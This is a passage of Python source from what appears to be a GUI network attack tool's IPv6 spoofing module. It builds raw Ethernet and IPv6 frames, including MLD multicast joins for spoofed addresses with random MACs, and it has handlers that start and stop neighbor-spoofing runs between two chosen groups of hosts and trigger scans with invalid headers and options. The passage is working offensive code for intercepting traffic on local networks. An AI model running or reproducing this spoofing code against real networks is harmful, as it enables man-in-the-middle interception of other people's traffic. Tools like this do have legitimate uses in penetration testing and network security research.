            ip6.extension_hdrs={}
            for i in dpkt.ip6.ext_hdrs:
                ip6.extension_hdrs[i]=None
            ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, data=struct.pack("!BBHBB", 5, 2, 0, 1, 0))
            
            ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), 
            dpkt.ip.IP_PROTO_ICMP6)
            icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
            eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton("33:33:00:00:00:16"),
                                            src=self.mac,
                                            data=str(ip6),
                                            type=dpkt.ethernet.ETH_TYPE_IP6
                                            )
            self.dnet.send(str(eth))
            self.log("ICMP6: Joined multicast group " + dnet.ip6_ntoa(dnet.ip6_aton("ff02::1:ff00:0000")[:13] + dnet.ip6_aton(ip_upper)[13:]))
        for host_lower in self.lower_add:
            hosts.append(host_lower)
            (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
            mld = struct.pack("!xxHBBH16s", 1, 4, 0, 0, dnet.ip6_aton("ff02::1:ff00:0000")[:13] + dnet.ip6_aton(ip_lower)[13:])
            icmp6 = dpkt.icmp6.ICMP6(   type=143,
                                        code=0,
                                        data=mld
                                        )
            icmp6_str = str(icmp6)
            ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_lower),
                                dst=dnet.ip6_aton("ff02::16"),
                                nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                                hlim=1,
                                data=icmp6,
                                plen=len(icmp6_str) + 8
                                )
            ip6.extension_hdrs={}
            for i in dpkt.ip6.ext_hdrs:
                ip6.extension_hdrs[i]=None
            ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, data=struct.pack("!BBHBB", 5, 2, 0, 1, 0))
            
            ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), 
            dpkt.ip.IP_PROTO_ICMP6)
            icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
            eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton("33:33:00:00:00:16"),
                                            src=self.mac,
                                            data=str(ip6),
                                            type=dpkt.ethernet.ETH_TYPE_IP6
                                            )
            self.dnet.send(str(eth))
            self.log("ICMP6: Joined multicast group " + dnet.ip6_ntoa(dnet.ip6_aton("ff02::1:ff00:0000")[:13] + dnet.ip6_aton(ip_lower)[13:]))
        self.upper_add = {}
        self.lower_add = {}
        return (data, org_data, hosts)

    # SIGNALS #

    def on_add_upper_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.upper_add_liststore.append([host, ip])
                    self.upper_add[host] = (ip, rand_mac, iter)

    def on_add_lower_button_clicked(self, data):
        select = self.hosts_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            host = model.get_value(model.get_iter(i), 0)
            if host not in self.upper_add:
                if host not in self.lower_add:
                    (ip, rand_mac, iter, reply) = self.hosts[host]
                    iter = self.lower_add_liststore.append([host, ip])
                    self.lower_add[host] = (ip, rand_mac, iter)

    def on_add_spoof_button_clicked(self, data):
        if not len(self.upper_add):
            return
        if not len(self.lower_add):
            return
        parent = self.spoof_treestore.append(None, [self.offline, "%i spoofs" % (len(self.upper_add) * len(self.lower_add)), None, None])
        cur = self.spoof_treestore.get_string_from_iter(parent)
        for host_upper in self.upper_add:
            for host_lower in self.lower_add:
                self.spoof_treestore.append(parent, [None, host_upper, host_lower, "0"])
        (data, org_data, hosts) = self.add_spoof()
        self.spoofs[cur] = (False, data, org_data, hosts)
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_clear_spoof_button_clicked(self, data):
        self.upper_add = {}
        self.lower_add = {}
        self.upper_add_liststore.clear()
        self.lower_add_liststore.clear()

    def on_remove_spoof_button_clicked(self, data):
        self.on_stop_spoof_button_clicked(data)
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            del self.spoofs[model.get_string_from_iter(parent)]
            model.remove(parent)

    def on_stop_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.offline)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            if run:
                self.spoofs[cur] = (False, data, org_data, hosts)
                for j in org_data:
                    self.dnet.eth.send(j)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, False)

    def on_start_spoof_button_clicked(self, data):
        select = self.spoof_treeview.get_selection()
        (model, paths) = select.get_selected_rows()
        for i in paths:
            parent = model.iter_parent(model.get_iter(i))
            if not parent:
                parent = model.get_iter(i)
            self.spoof_treestore.set_value(parent, 0, self.online)
            cur = self.spoof_treestore.get_string_from_iter(parent)
            (run, data, org_data, hosts) = self.spoofs[cur]
            self.spoofs[cur] = (True, data, org_data, hosts)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, True)
        if not self.spoof_thread.is_alive():
            self.spoof_thread.start()
        self.spoof_thread.wakeup()

    def on_scan_start_button_clicked(self, data):
        self.scan()

    def on_invalid_header_scan_button_clicked(self, data):
        self.invalid_header()
    
    def on_invalid_option_scan_button_clicked(self, data):
        self.invalid_option()
    
    def get_config_dict(self):
        return {    "spoof_delay" : {   "value" : self.spoof_delay,
                                        "type" : "int",
                                        "min" : 1,
                                        "max" : 100
                                        },
                    "forward_constrain" :   {   "value" :   self.forward_constrain,
                                                "type"  :   "str",
                                                "min"   :   0,
                                                "max"   :   10000
                                                }
                    }

    def set_config_dict(self, dict):
        if dict:
            self.spoof_delay = dict["spoof_delay"]["value"]
            self.forward_constrain = dict["forward_constrain"]["value"]
